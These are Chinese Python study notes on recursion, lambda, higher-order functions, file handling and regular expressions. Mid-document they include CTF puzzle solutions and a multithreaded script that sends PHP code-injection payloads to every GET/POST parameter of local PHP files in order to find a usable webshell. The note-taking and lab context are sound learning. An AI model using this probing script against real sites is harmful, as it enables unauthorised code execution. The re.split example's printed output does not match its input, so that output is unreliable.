# Python - 递归

- [学习来源](https://www.bilibili.com/video/BV1o4411M71o?p=1)

<p align="center">
    <img src="http://p1.music.126.net/d2IB2I-8FcSOWN7xk1lwxA==/109951165274287603.jpg?param=130y130" width="25%">
</p>

<p align="center">👴 百变酒精</p>
<p align="center"><a href="https://music.163.com/#/song?id=1474404223"><font>《Centerfold》</font></a> </p>
<p align="center">专辑：百变酒精</p>
<p align="center">歌手：法老</p>


## 递归

**递归的应用场景**

递归是一种编程思想，应用场景:
  1. 在我们日常开发中，如果要遍历一个文件夹下面所有的文件，通常会使用递归来实现：
  2. 在后续的算法课程中，很多算法都离不开递归，例如：快速排序。

**递归的特点**
  - 函数的内部自己调用自己
  - 必须要有出口

#### 实例

应用：3以内数字累加和
- 代码：
```py
# 3+2+1
def sum_numbers(num):
    # 1.如果是1,则直接返回1 -- 出口
    if num == 1:
        return 1
    # 2 如果不是1，则重复执行累加并返回结果
    return num + sum_numbers(num-1)
Num = int(input('输入一个开始数字'))
sum_result = sum_numbers(Num)
# 输出结果为6
print(sum_result)
```
> 此时当输入数值大于 1000 时会报错

## lambda

### lambda 表达式

什么是 `lambda` ：为了简化代码
适配场景：如果一个函数有一个返回值，并且只有一句代码，则可以使用`lambda`简化。

`lambda` 语法:
```py
lambda 参数列表:表达式
```
> 注意
- lambda 表达式的参数可有可无，函数的参数在lambda 表达式中完全适用。
- lambda 表达式能接收任何数量的参数，但是只能返回一个表达式的值。

**实例**
> 使用函数和lambda 分别实现 打印 100
```py
# 需求 函数 返回值100
# 1.使用函数
def fn1():
    return 100

print(fn1())



# 2.使用lambda
print((lambda:100))
'''
发现打印出的是内存地址
<function <lambda> at 0x000001CA1FDA3D38>
'''
# 当我们调用返回值
fn2 = lambda:100
print(fn2())
# 发现返回为100
'''
100
'''
```

### **实例**

> 输入两个值，计算 a+b
- **函数实现**
    ```py
    int1 = input('a:')
    int2 = input('b:')
    def add(a, b):
        a = int(a)
        b = int(b)
        return a + b


    resout = add(int1, int2)
    print(resout)
    '''
    a:1
    b:1
    2
    '''
    ```

- **使用 lambda**
    ```py
    int1 = input('a:')
    int2 = input('b:')

    num = lambda a, b: int(a) + int(b)
    print(num(int1,int2))
    ```

#### lambda的参数形式

- **无参数**
    ```py
    fn1 = lambda:100
    print(fn1())
    ```

- **一个参数**
    ```py
    fn1 = lambda a: a
    print(fn1('hello world'))
    ```

- **默认参数**
    ```py
    int1 = input('a:')
    int2 = input('b:')

    fn1 = lambda a,b,c=100 : int(a) + int(b) +c # 此时c是默认参数 100
    print(fn1(int1,int2)) # 此时值为：int1 + int2 +100
    print(fn1(int1,int2,200)) # 此时值为：int1 + int2 +200
    ```

- **可变参数(不定长参数)**
    ```py
    int1 = input('a:')
    int2 = input('b:')

    fn1= lambda *args:args
    print(fn1(int1,int2))

    '''
    a:11
    b:22
    ('11', '22')
    '''
    ```

- **可变参数(kwargs)**
    ```py
    int1 = input('a:')
    int2 = input('b:')

    fn5 = lambda **kwargs:kwargs # 返回一个字典
    print(fn5(name = int1,age = int2))
    '''
    a:tom
    b:12
    {'name': 'tom', 'age': '12'}
    '''
    ```

## lambda 的应用

- 带判断的**lambda**
    > 输入两个数，判断两个数的大小
    ```py
    int1 = input('a:')
    int2 = input('b:')

    fn5 = lambda a,b:a if int(a) > int(b) else b
    print(fn5(int1,int2))
    ```
-  对 name key 对应的值进行升序排序
    ```py
        students = [
        {'name':'tom','age':'12'},
        {'name':'Rose','age':'24'},
        {'name':'Jack','age':'20'}
    ]

    # 对 name key 对应的值进行升序排序
    students.sort(key=lambda x: x['name'])
    print(students)
    ```

-  对 name key 对应的值进行降序排序
    ```py
        students = [
        {'name':'tom','age':'12'},
        {'name':'Rose','age':'24'},
        {'name':'Jack','age':'20'}
    ]

    # 对 name key 对应的值进行降序排序
    students.sort(key=lambda x: x['name'],reverse = True)
    print(students)
    ```

## 高阶函数
> 指将函数作为参数传入，这样的函数称为高阶函数，高阶函数是函数式编程的体现。函数式编程就是指这种抽象的编程范式。

实例：
将任意两个数字，按照指定要求整理数字后再进行求和计算。

- 实例一：
    ```py
    inta = int(input('a:'))
    intb = int(input('b:'))
    result = lambda a, b:abs(a)+abs(b) # abs() 函数返回数字的绝对值。
    print(result(inta,intb))

    '''
    运行结果：
    a:-3
    b:5
    8
    '''
    ```

- 实例二：
    ```py
    inta = int(input('a:'))
    intb = int(input('b:'))
    result = lambda a,b,f:f(a)+f(b)
    print(result(inta,intb,abs))

    '''
    运行结果：
    a:-3
    b:5
    8
    '''
    ```
    假如才此时，我们需要对inta 和intb进行四舍五入的运算，此时第一种方法只能重新定义一个函数或者重写函数。而第二个函数则直接修改传入的数值即可进行更改。

    > 两种写法对比后会发现，方法2的代码会更急简洁，函数灵活性更高。
函数式编程大量使用函数，减少了代码的重复，因此程序会比较短，开发速度较快。

### 内置高阶函数

#### map()

map(func,lst),将传入的函数变量 func 作用到lst 变量的每个元素中，并将结果组成新的列表(py2)/迭代器(py3)返回

需求：计算`list1`序列中各个数字的2次方。

```py
# 1. 准备列表数据
list1 = [1, 2, 3, 4, 5]
# 2. 准备2次方计算的函数
def func(x):
    return x**2
# 3.调用map
result = map(func, list1)
# 4.输出结果
print(result)
'''
此时输出的是迭代器：
<map object at 0x000001ED2C5A6648>
'''
# 需要将数据类型转换为列表
print(list(result))
'''
[1, 4, 9, 16, 25]
'''
```

#### reduce()

reduce(func,lst),其中 func 必须要有两个参数。每次 func 计算的结果继续和序列的下一个元素做累积计算。

> 注意：reduce() 传入的参数 func 必须接收 2个参数。

需求：计算 list1 序列中各个数字累计的和。

如果想要使用该函数，必须导入对应的库
```py
# 1. 准备列表数据并导入模块
list1 = [1, 2, 3, 4, 5]
import functools
# 2. 准备功能函数
def func(a,b):
    return a + b
# 3.调用reduse计算函数的累加和
result = functools.reduce(func,list1)
print(result) # 15

```
> 注意该函数为累计叠加的方法。


#### filter()

filter(func,lst) 函数用于过滤序列，过滤掉不符合条件的元素，返回一个filter 对象。如果要转换为列表，可以使用list()来转换。

```py
# 1. 准备列表数据
list1 = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
# 2. 准备功能函数
def func(x):
    return x % 2 == 0
# 对目标函数进行过滤
result = filter(func,list1)

print(result)
'''
<filter object at 0x000001D50F0A6788>
'''
print(list(result))
'''
[2, 4, 6, 8, 10]
'''
```

### 总结

- 递归
  - 函数内部自己调用自己
  - 必须有出口
- lambda
  - 语法
    ```py
    lambda 参数列表：表达式
    ```
  - lambda 的参数形式
    - 无参数
    ```py
    lambda:表达式
    ```
    - 一个参数
    ```py
    lambda 参数：表达式
    ```
    - 默认参数
    ```py
    lambda key = value:表达式
    ```
    - 不定长位置参数
    ```py
    lambda *args:表达式
    ```
    - 不定长关键字参数
    ```py
    lambda **kwargs: 表达式
    ```
- 高阶函数
  - map()
  - reduce()
  - filter()

## 文件操作

### 目录

 - 文件操作的作用
 - 文件的基本操作
   - 打开
   - 读写
   - 关闭
 - 文件备份
 - 文件和文件夹的操作

### 文件操作的作用

> 什么是文件?什么是文件操作

文件操作包含什么？打开、关闭、读写、复制等等

文件的操作的作用是什么？
读取内存，写入内存，备份内存...

> 文件的操作的作用就是 `把一些内容(数据)存储起来，方便程序下一次执行的时候直接使用，不必重新制作一份，省时省力。`

### 文件的基本操作

> 文件的操作步骤

- 打开文件
- 读写等操作
- 关闭文件

#### 打开文件

在python中，使用open 函数，`可以打开一个已经存在的文件，或者创建一个新文件`，语法如下：
```py
open(name,mode)

open('/root/1.txt','w')
```

- name:是要打开的目标文件名的字符串(可以包含文件所在的具体路径)。
- mode:设置打开文件的模式(访问模式)：写入，只读，追加等等。


体验文件操作

- 1. 打开

- 2. 读写操作

- 3. 关闭

```py
# 1. 打开文件
f = open('12.txt','w')
# 2. 读写操作
f.write('test')
# 3， 关闭文件
f.close()
```
> 如果是存在文件则写入，不存在会自动创建文件。此时会发现，文件中已经写入 test 字符。



#### 读取函数

- read()
```py
文件对象.read(num)
```
> num表示要从文件中读取的数据的长度(单位是X字节)，如果没有传入 num，那么就表示读取文件中的所有数据。

- readlines()

readlines 可以按照行的方式把整个文件中的内容进行一次读取，并且返回一个是列表，妻子每一行的数据为一个元素。

```py
# 1. 打开文件,对文件进行写入数据，并读取文件内容的操作。
f = open('1.txt','w')
# 2. 读写操作
f.write('test')
f.close()
f = open('1.txt')
content = f.readlines()
# 3， 关闭文件
f.close()
print(content)
```



**通过二进制数生成二维码**
```py
from PIL import Image
x = 45
y = 45
im = Image.new('RGB', (x, y))
white = (255, 255, 255)
black = (0, 0, 0)
with open('D:\py\新建文件夹\ss.txt') as f:
    for i in range(x):
        ff = f.readline()
        for j in range(y):
            if ff[j] == '1':
                im.putpixel((i, j), black)
            else:
                im.putpixel((i, j), white)
im.show()
```

**color**
```py
c1 = '11111111010111101111'
c2 = '11111011111110111111'
c3 = '00001100101010110001'
c4 = '01001010010000001101'
c5 = '11010011011101010111'
c6 = '10011011011010110110'
c7 = '00111001101101111101'

flag = ''

for i in range(0,20):
    c = c1[i]+c2[i]+c3[i]+c4[i]+c5[i]+c6[i]+c7[i]
    flag += chr(int(c,2))

print (flag)
```

**怀疑人生**




`flag{hacker`

```
..... ..... ....! ?!!.? ..... ..... ....? .?!.? ....! .?... ..... .....
..!?! !.?.. ..... ..... ..?.? !.?.. ..... ..... ..... ..... !.?.. .....
..... .!?!! .?!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ....! ?!!.?
!!!!! !?.?! .?!!! !!!!! !!!!! .!!!. ?.... ..... ..... .!?!! .?... .....
..... .?.?! .?!.? .
```

ook编码

那么在线 解码 `https://www.splitbrain.org/services/ook`

![](img/6.png)

得到   3oD54e

查了好久这个居然是base58

还是base58在线解码  `https://www.jisuan.mobi/pbHzbBHbzHB6uSJx.html`

得到 `misc`

flag{hackermisc12580}





**脚本分析**
> 猜测这几千个php文件中肯定含有可以使用的shell，我们只有写脚本去试了.
```py
import os
import requests
import re
import threading
import time
print('开始时间：  '+  time.asctime( time.localtime(time.time()) ))
s1=threading.Semaphore(100)  							  			#这儿设置最大的线程数
filePath = r"C:\phpStudy\PHPTutorial\WWW\src"
os.chdir(filePath)													#改变当前的路径
requests.adapters.DEFAULT_RETRIES = 5								#设置重连次数，防止线程数过高，断开连接
files = os.listdir(filePath)
session = requests.Session()
session.keep_alive = False											 # 设置连接活跃状态为False
def get_content(file):
    s1.acquire()
    print('trying   '+file+ '     '+ time.asctime( time.localtime(time.time()) ))
    with open(file,encoding='utf-8') as f:							#打开php文件，提取所有的$_GET和$_POST的参数
            gets = list(re.findall('\$_GET\[\'(.*?)\'\]', f.read()))
            posts = list(re.findall('\$_POST\[\'(.*?)\'\]', f.read()))
    data = {}														#所有的$_POST
    params = {}														#所有的$_GET
    for m in gets:
        params[m] = "echo 'xxxxxx';"
    for n in posts:
        data[n] = "echo 'xxxxxx';"
    url = 'http://127.0.0.1/src/'+file
    req = session.post(url, data=data, params=params)			#一次性请求所有的GET和POST
    req.close()												# 关闭请求  释放内存
    req.encoding = 'utf-8'
    content = req.text
    #print(content)
    if "xxxxxx" in content:									#如果发现有可以利用的参数，继续筛选出具体的参数
        flag = 0
        for a in gets:
            req = session.get(url+'?%s='%a+"echo 'xxxxxx';")
            content = req.text
            req.close()												# 关闭请求  释放内存
            if "xxxxxx" in content:
                flag = 1
                break
        if flag != 1:
            for b in posts:
                req = session.post(url, data={b:"echo 'xxxxxx';"})
                content = req.text
                req.close()												# 关闭请求  释放内存
                if "xxxxxx" in content:
                    break
        if flag == 1:													#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，
            param = a
        else:
            param = b
        print('找到了利用文件： '+file+"  and 找到了利用的参数：%s" %param)
        print('结束时间：  ' + time.asctime(time.localtime(time.time())))
    s1.release()

for i in files:															#加入多线程
   t = threading.Thread(target=get_content, args=(i,))
   t.start()
```

---

## Python 正则表达式

正则表达式是从左到右来匹配一个字符串的。它能帮助你去检查或匹配出对应的字符串信息。

python中只要加入 re 模块即可匹配全部的正则表达式。

**re.match函数**

函数语法：
```py
re.match(pattern,string,flags=0)
```
|参数|描述|
|-|-|
|pattern|匹配的正则表达式|
|string|要匹配的字符串|
|flags|标志位，用于控制正则表达式的匹配方式|

> 匹配成功 `re.match` 方法返回一个匹配的对象，否则返回 `None`。

我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。

|匹配对象方法	|描述|
|-|-|
|group(num=0)|	匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组。
|groups()	|返回一个包含所有小组字符串的元组，从 1 到 所含的小组号。


```py
import re
print(re.match('aaa', 'aaa.bbb.ccc').span())  # 在起始位置匹配
print(re.match('bbb', 'aaa.bbb.ccc').span())         # 不在起始位置匹配
```
返回：

```
(0, 3)
none
```

**re.search函数**

`re.search` 尝试去匹配全部字符串，去找到一个对应的成功匹配的结果。

|参数	|描述|
|-|-|
|pattern	|匹配的正则表达式
|string	|要匹配的字符串。
|flags	|标志位，用于控制正则表达式的匹配方式

> 匹配成功re.search方法返回一个匹配的对象，否则返回None。


```py
# 实例：
import re
print(re.search('bbb', 'aaa.bbb.ccc').span())  # 在起始位置匹配
print(re.search('aaa', 'aaa.bbb.ccc').span())         # 不在起始位置匹配
```
返回：
```
(0, 3)
(4, 7)
```

**修饰符： re.S，re.M，re.I**

> 修饰标识符被指定成一个可选的范围，可以理解为通过按位OR(|) 他们来指定，如`re.S，re.M，re.I` 等等来识别修饰符。

|修饰符	|描述
|-|-|
|re.I|	使匹配对大小写不敏感
|re.L|	做本地化识别（locale-aware）匹配
|re.M|	多行匹配，影响 ^ 和 $
|re.S|	使 . 匹配包括换行在内的所有字符
|re.U|	根据Unicode字符集解析字符。这个标志影响 \w, \W, \b, \B.
|re.X|	该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。



示例：

re.I(不区分大小写)
```py
import re
a = "AcadsdfghgjhgjhGhHghGfFhKmNM";
search = re.findall(r'[g]',a,re.I)
print(search)

'''
输出结果
['g', 'g', 'g', 'G', 'g', 'G']
'''
```

### 检测和替换

**re.sub 函数**

语法;
`re.sub(pattern, repl, string, count=0, flags=0)`

|参数|作用
|-|-|
|pattern| : 正则中的模式字符串。
|repl : |替换的字符串，`也可为一个函数`。
|string : |要被查找替换的原始字符串。
|count :| 模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。

示例：
```py
import re
a = "AcadsdfghgjhgjhGhHghGfFhKmNM";
search = re.sub(r'[g]','-',a)
print(search)

'''
输出结果
Acadsdf-h-jh-jhGhH-hGfFhKmNM
'''
```

当 `repl` 参数为一个函数时

将匹配到的数全部乘2
```py
import re
def double(number):
    value=int(number.group('value'))
    return str(value*2)

s = '12421w gf1wsdqr12315152315'
print(re.sub('(?P<value>\d+)', double, s))

'''
输出结果
24842w gf2wsdqr24630304630
'''
```

**re.compile 函数**

> 用于生成正则表达式的对象，用于提供 match()和search()函数使用。

语法格式是：
`re.compile(patten[,flag])`

示例：

```py
import re
patten = re.compile(r'[0-9]')
number = patten.findall('o1o2o3o4o5o6')
print(number)
```

**findall 函数**

> `match` 和 `search` 是匹配一次，但是 `findall` 匹配所有。

语法格式：
`findall(string[, pos[, endpos]])`

|参数|作用
|-|-|
|string |待匹配的字符串。
|pos | 可选参数，指定字符串的起始位置，默认为 0。
|endpos | 可选参数，指定字符串的结束位置，默认为字符串的长度。

语法：

```py
import re

pattern = re.compile(r'\d+')   # 只查找数字
result1 = pattern.findall('1o2o3o4o5o6o7')
result2 = pattern.findall('1o2o3o4o5o6o7', 1, 10) # 从第二位开始

print(result1)
print(result2)

'''
输出结果
['1', '2', '3', '4', '5', '6', '7']
['2', '3', '4', '5']
'''
```

**re.finditer 函数**

> 和 findall 类似,在字符串中找到正则表达式中匹配的所有字符串，把它们作为一个迭代器返回。

语法规则：
`re.finditer(pattern, string, flags=0)`

|参数|作用
|-|-|
|pattern|	匹配的正则表达式
|string	|要匹配的字符串。
|flags	|标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。

示例：
```py
import re

it = re.finditer(r"\d+", "1o2o3o4o5o6o7o") # 在字符串中匹配数字
for match in it:
    print(match.group())
'''
输出结果
1
2
3
4
5
6
7
'''
```


**re.split 函数**

> `split` 方法非常强大，可以使用()分组捕获。不需要使用span()一个一个捕获

`re.split(pattern, string[, maxsplit=0, flags=0])`

|参数|作用|
|-|-|
|pattern|	匹配的正则表达式
|string	|要匹配的字符串。
|maxsplit|	分隔次数，maxsplit=1 分隔一次，默认为 0，不限制|次数。
|flags	|标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。

用于匹配多个条件
```py
import re
def re_split_test():
    a = '姓名张三性别男身份证123000000000000000电话13800000000'
    re_split_pattern = re.compile('(姓名|性别|身份证|电话)')
    list1=re.split(re_split_pattern, a)
    print(list1)

if __name__ == '__main__':
    re_split_test()
'''
输出结果
['', '姓名', ':张三,', '性别', ':男,', '身份证', ':123000000000000000,', '电话', ':13800000000']
'''
```














